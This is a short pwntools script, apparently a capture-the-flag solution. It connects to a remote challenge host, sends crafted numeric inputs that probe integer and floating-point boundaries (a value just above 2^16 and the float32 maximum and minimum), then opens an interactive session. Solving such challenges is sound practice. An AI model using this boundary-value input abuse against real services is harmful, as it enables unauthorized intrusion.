from pwn import *

io = remote("0.cloud.chals.io", 30531)

io.sendlineafter(b":", str((1 << 16) + 2).encode())
io.sendlineafter(b":", str(0.0999999).encode())
io.sendlineafter(b":", str(3.40282e38).encode())
io.sendlineafter(b":", str(-3.40282e38).encode())
io.interactive()
